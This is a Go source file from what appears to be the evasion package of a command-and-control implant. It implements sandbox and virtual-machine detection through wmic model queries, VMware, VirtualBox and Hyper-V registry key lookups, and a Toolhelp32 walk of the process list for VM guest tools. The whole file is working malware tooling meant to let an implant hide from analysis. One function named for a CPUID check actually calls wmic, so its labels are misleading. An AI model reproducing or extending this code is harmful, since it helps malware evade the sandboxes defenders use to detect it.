//go:build windows

package evasion

import (
	"os/exec"
	"strings"
	"unsafe"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// IsVM returns true if any VM/sandbox artifact is detected.
func IsVM() bool {
	return checkCPUIDHypervisor() ||
		checkVMRegistryKeys() ||
		checkVMProcesses()
}

func checkCPUIDHypervisor() bool {
	out, err := exec.Command("wmic", "computersystem", "get", "model").Output()
	if err != nil {
		return false
	}
	model := strings.ToLower(string(out))
	for _, kw := range []string{"virtual", "vmware", "vbox", "kvm", "qemu", "hyper-v", "xen", "parallels"} {
		if strings.Contains(model, kw) {
			return true
		}
	}
	return false
}

func checkVMRegistryKeys() bool {
	keys := []string{
		`HKLM\SOFTWARE\VMware, Inc.\VMware Tools`,
		`HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions`,
		`HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters`,
	}
	for _, k := range keys {
		out, err := exec.Command("reg", "query", k).CombinedOutput()
		if err == nil && len(out) > 0 {
			return true
		}
	}
	return false
}

func checkVMProcesses() bool {
	vmProcs := []string{
		"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
		"vboxservice.exe", "vboxtray.exe",
		"vmsrvc.exe", "vmusrvc.exe",
		"xenservice.exe", "qemu-ga.exe",
	}

	type PROCESSENTRY32W struct {
		dwSize              uint32
		cntUsage            uint32
		th32ProcessID       uint32
		th32DefaultHeapID   uintptr
		th32ModuleID        uint32
		cntThreads          uint32
		th32ParentProcessID uint32
		pcPriClassBase      int32
		dwFlags             uint32
		szExeFile           [260]uint16
	}

	hSnap, _, _ := winsyscall.ProcCreateToolhelp32Snapshot.Call(uintptr(winsyscall.Th32csSnapProcess), 0)
	if hSnap == ^uintptr(0) {
		return false
	}

	pe := PROCESSENTRY32W{dwSize: uint32(unsafe.Sizeof(PROCESSENTRY32W{}))}
	winsyscall.ProcProcess32First.Call(hSnap, uintptr(unsafe.Pointer(&pe)))

	for {
		exeName := strings.ToLower(utf16ToString(pe.szExeFile[:]))
		for _, vm := range vmProcs {
			if exeName == vm {
				return true
			}
		}
		r, _, _ := winsyscall.ProcProcess32Next.Call(hSnap, uintptr(unsafe.Pointer(&pe)))
		if r == 0 {
			break
		}
	}
	return false
}

func utf16ToString(u16 []uint16) string {
	end := len(u16)
	for i, c := range u16 {
		if c == 0 {
			end = i
			break
		}
	}
	runes := make([]rune, end)
	for i, c := range u16[:end] {
		runes[i] = rune(c)
	}
	return string(runes)
}

// AntiVMReport returns a string summarising detected VM artifacts.
func AntiVMReport() string {
	var findings []string
	if checkCPUIDHypervisor() {
		findings = append(findings, "CPUID[hypervisor bit]")
	}
	if checkVMRegistryKeys() {
		findings = append(findings, "RegistryArtifacts")
	}
	if checkVMProcesses() {
		findings = append(findings, "VMProcesses")
	}
	if len(findings) == 0 {
		return "clean"
	}
	return strings.Join(findings, ", ")
}
